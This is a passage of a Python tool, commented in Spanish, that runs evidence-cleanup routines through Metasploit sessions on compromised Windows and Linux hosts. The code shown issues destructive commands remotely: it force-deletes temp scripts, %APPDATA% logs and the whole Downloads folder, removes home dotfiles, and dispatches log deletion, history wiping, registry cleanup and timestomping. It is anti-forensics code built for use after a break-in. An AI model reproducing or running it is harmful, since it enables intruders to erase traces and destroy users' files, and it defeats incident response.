            logger.info(f"Limpiando artefactos de sesión en {session_id}")
            
            if "windows" in platform.lower():
                # En Windows, buscar y eliminar artefactos específicos
                
                # 1. Archivos de lote o scripts temporales
                temp_dirs = [
                    "C:\\Windows\\Temp", 
                    "C:\\Temp", 
                    "%TEMP%", 
                    "%TMP%"
                ]
                
                for temp_dir in temp_dirs:
                    try:
                        # Buscar y eliminar archivos sospechosos
                        file_patterns = [
                            "*.bat", "*.vbs", "*.ps1", "*.exe", "*.dll", "*.tmp", "*.b64"
                        ]
                        
                        for pattern in file_patterns:
                            del_cmd = f'del /f /q "{temp_dir}\\{pattern}" 2>&1'
                            self.run_command_on_session(session_id, del_cmd)
                        
                        result["artifacts_cleaned"].append(f"{temp_dir} scripts temporales")
                        logger.info(f"Scripts temporales eliminados de {temp_dir}")
                    except Exception as e:
                        result["errors"].append(f"Error al limpiar {temp_dir}: {str(e)}")
                        logger.error(f"Error al limpiar {temp_dir}: {str(e)}")
                
                # 2. Limpiar evidencias en directorio %APPDATA%
                try:
                    appdata_cmd = f'del /f /q /s "%APPDATA%\\*.log" "%APPDATA%\\*.tmp" 2>&1'
                    self.run_command_on_session(session_id, appdata_cmd)
                    
                    result["artifacts_cleaned"].append("%APPDATA% archivos temporales")
                    logger.info("Archivos temporales eliminados de %APPDATA%")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar %APPDATA%: {str(e)}")
                    logger.error(f"Error al limpiar %APPDATA%: {str(e)}")
                
                # 3. Limpiar archivos en carpeta de descargas
                try:
                    downloads_cmd = f'del /f /q /s "%USERPROFILE%\\Downloads\\*" 2>&1'
                    self.run_command_on_session(session_id, downloads_cmd)
                    
                    result["artifacts_cleaned"].append("%USERPROFILE%\\Downloads")
                    logger.info("Archivos eliminados de carpeta de descargas")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar carpeta de descargas: {str(e)}")
                    logger.error(f"Error al limpiar carpeta de descargas: {str(e)}")
            
            else:  # Linux/Unix
                # En Linux, buscar y eliminar artefactos específicos
                
                # 1. Archivos temporales y scripts
                temp_dirs = [
                    "/tmp", 
                    "/var/tmp", 
                    "/dev/shm"
                ]
                
                for temp_dir in temp_dirs:
                    try:
                        # Buscar y eliminar archivos sospechosos
                        cmd = f'find {temp_dir} -type f \\( -name "*.sh" -o -name "*.py" -o -name "*.pl" -o -name "*.b64" -o -name "*.tmp" \\) -exec rm -f {{}} \\; 2>/dev/null'
                        self.run_command_on_session(session_id, cmd)
                        
                        result["artifacts_cleaned"].append(f"{temp_dir} scripts temporales")
                        logger.info(f"Scripts temporales eliminados de {temp_dir}")
                    except Exception as e:
                        result["errors"].append(f"Error al limpiar {temp_dir}: {str(e)}")
                        logger.error(f"Error al limpiar {temp_dir}: {str(e)}")
                
                # 2. Limpiar evidencias en directorio home
                try:
                    home_cmd = 'find $HOME -maxdepth 1 -type f -name ".*" -not -name ".bashrc" -not -name ".profile" -exec rm -f {} \\; 2>/dev/null'
                    self.run_command_on_session(session_id, home_cmd)
                    
                    # Limpiar ~/Downloads
                    downloads_cmd = 'rm -rf $HOME/Downloads/* 2>/dev/null'
                    self.run_command_on_session(session_id, downloads_cmd)
                    
                    result["artifacts_cleaned"].append("$HOME archivos temporales")
                    logger.info("Archivos temporales eliminados de $HOME")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar $HOME: {str(e)}")
                    logger.error(f"Error al limpiar $HOME: {str(e)}")
                
                # 3. Limpiar archivos con nombres sospechosos en todo el sistema
                try:
                    suspicious_cmd = 'find /tmp /var/tmp /dev/shm $HOME -type f -name "*backdoor*" -o -name "*hack*" -o -name "*pwn*" -o -name "*shell*" -exec rm -f {} \\; 2>/dev/null'
                    self.run_command_on_session(session_id, suspicious_cmd)
                    
                    result["artifacts_cleaned"].append("Archivos con nombres sospechosos")
                    logger.info("Archivos con nombres sospechosos eliminados")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar archivos sospechosos: {str(e)}")
                    logger.error(f"Error al limpiar archivos sospechosos: {str(e)}")
            
            # Si se limpiaron algunos artefactos, consideramos éxito parcial
            if result["artifacts_cleaned"]:
                result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"Error general en limpieza de artefactos: {str(e)}")
            logger.error(f"Error general en limpieza de artefactos: {str(e)}")
        
        return result
    
    def perform_cleanup(self, session_id, target_info=None, output_file=None):
        """Ejecuta todas las tareas de limpieza en una sesión"""
        start_time = datetime.now()
        logger.info(f"Iniciando limpieza de evidencias en sesión {session_id} a las {start_time.strftime('%H:%M:%S')}")
        
        if not target_info:
            target_info = {}
        
        result = {
            'session_id': session_id,
            'timestamp': datetime.now().isoformat(),
            'cleanup_info': {
                'duration': None,
                'techniques_used': self.config.get("cleanup_techniques", [])
            },
            'logs_cleanup': None,
            'command_history_cleanup': None,
            'temp_files_cleanup': None,
            'registry_cleanup': None,
            'timestomp_results': None,
            'session_artifacts_cleanup': None,
            'success': False,
            'message': ""
        }
        
        try:
            # Verificar si la sesión existe
            if not self.initialize_msf():
                logger.error("No se pudo inicializar Metasploit RPC")
                result['cleanup_info']['error'] = "Error al inicializar Metasploit RPC"
                return result
            
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                result['cleanup_info']['error'] = f"La sesión {session_id} no existe"
                return result
            
            # Obtener información del sistema
            session_info = sessions[str(session_id)]
            platform = session_info.get('platform', '').lower()
            
            # Aplicar técnicas de limpieza según la configuración
            cleanup_techniques = self.config.get("cleanup_techniques", [])
            
            # 1. Limpieza de logs
            if "logs_deletion" in cleanup_techniques:
                logger.info(f"Ejecutando limpieza de logs en sesión {session_id}")
                
                if "windows" in platform:
                    logs_result = self.cleanup_windows_logs(session_id)
                else:
                    logs_result = self.cleanup_linux_logs(session_id)
                
                result['logs_cleanup'] = logs_result
            
            # 2. Limpieza de historial de comandos
            if "command_history" in cleanup_techniques:
                logger.info(f"Ejecutando limpieza de historial de comandos en sesión {session_id}")
                
                history_result = self.cleanup_command_history(session_id, platform)
                result['command_history_cleanup'] = history_result
            
            # 3. Limpieza de archivos temporales
            if "temp_files" in cleanup_techniques:
                logger.info(f"Ejecutando limpieza de archivos temporales en sesión {session_id}")
                
                temp_result = self.cleanup_temp_files(session_id, platform)
                result['temp_files_cleanup'] = temp_result
            
            # 4. Limpieza de registro (solo Windows)
            if "registry_keys" in cleanup_techniques and "windows" in platform:
                logger.info(f"Ejecutando limpieza de registro en sesión {session_id}")
                
                registry_result = self.cleanup_registry_keys(session_id)
                result['registry_cleanup'] = registry_result
            
            # 5. Timestomping de archivos
            if "file_timestomp" in cleanup_techniques:
                logger.info(f"Ejecutando timestomping de archivos en sesión {session_id}")
                
                timestomp_result = self.timestomp_files(session_id, platform)
                result['timestomp_results'] = timestomp_result
            
            # 6. Limpieza de artefactos de sesión
            if "session_artifacts" in cleanup_techniques:
                logger.info(f"Ejecutando limpieza de artefactos de sesión en {session_id}")
                
                artifacts_result = self.cleanup_session_artifacts(session_id, platform)
                result['session_artifacts_cleanup'] = artifacts_result
            
            # Verificar éxito general
            success_count = 0
            total_techniques = 0
            
            if result['logs_cleanup'] and result['logs_cleanup'].get('success', False):
                success_count += 1
            if result['logs_cleanup']:
                total_techniques += 1
            
            if result['command_history_cleanup'] and result['command_history_cleanup'].get('success', False):
                success_count += 1
            if result['command_history_cleanup']:
                total_techniques += 1
            
            if result['temp_files_cleanup'] and result['temp_files_cleanup'].get('success', False):
                success_count += 1
            if result['temp_files_cleanup']:
                total_techniques += 1
            
            if result['registry_cleanup'] and result['registry_cleanup'].get('success', False):
                success_count += 1
            if result['registry_cleanup']:
                total_techniques += 1
            
            if result['timestomp_results'] and result['timestomp_results'].get('success', False):
                success_count += 1
            if result['timestomp_results']:
                total_techniques += 1
            
            if result['session_artifacts_cleanup'] and result['session_artifacts_cleanup'].get('success', False):
                success_count += 1
            if result['session_artifacts_cleanup']:
                total_techniques += 1
            
            # Calcular tasa de éxito
            if total_techniques > 0:
                success_rate = (success_count / total_techniques) * 100
                
                if success_rate >= 75:
                    result['success'] = True
                    result['message'] = f"Limpieza completa con una tasa de éxito del {success_rate:.1f}%"
                elif success_rate >= 50:
                    result['success'] = True
                    result['message'] = f"Limpieza parcial con una tasa de éxito del {success_rate:.1f}%"
                else:
                    result['success'] = False
                    result['message'] = f"Limpieza limitada con una tasa de éxito del {success_rate:.1f}%"
            else:
                result['success'] = False
                result['message'] = "No se aplicaron técnicas de limpieza"
        
        except Exception as e:
            logger.error(f"Error en limpieza de evidencias: {str(e)}")
            result['cleanup_info']['error'] = f"Error: {str(e)}"
            result['message'] = f"Error en limpieza de evidencias: {str(e)}"
        
        # Calcular duración
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        result['cleanup_info']['duration'] = duration
        logger.info(f"Limpieza de evidencias finalizada. Duración: {duration} segundos")
        
        # Guardar resultados
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(result, f, indent=2)
            logger.info(f"Resultados guardados en {output_file}")
        
        return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Herramienta de limpieza de evidencias')
    parser.add_argument('-s', '--session', required=True, help='ID de sesión de Metasploit')
    parser.add_argument('-t', '--target', help='Información del objetivo en formato JSON')
    parser.add_argument('-o', '--output', help='Archivo de salida para resultados JSON')
    parser.add_argument('-c', '--config', default='/opt/pentest/config/cleanup-config.json', 
                        help='Archivo de configuración personalizado')
    parser.add_argument('--techniques', nargs='+', 
                        choices=['logs_deletion', 'command_history', 'temp_files', 'registry_keys', 
                                'file_timestomp', 'session_artifacts'],
                        help='Técnicas de limpieza específicas a aplicar')
    
    args = parser.parse_args()
    
    # Cargar datos del objetivo si se proporciona
    target_info = None
    if args.target:
        try:
            with open(args.target, 'r') as f:
                target_info = json.load(f)
        except Exception as e:
            logger.error(f"Error al cargar archivo del objetivo: {str(e)}")
    
    # Crear directorio de salida si no existe
    if args.output:
        os.makedirs(os.path.dirname(os.path.abspath(args.output)), exist_ok=True)
    
    evidence_cleanup = EvidenceCleanup(args.config)
    
    # Establecer técnicas específicas si se proporcionan
    if args.techniques:
        evidence_cleanup.config['cleanup_techniques'] = args.techniques
    
    evidence_cleanup.perform_cleanup(args.session, target_info, args.output)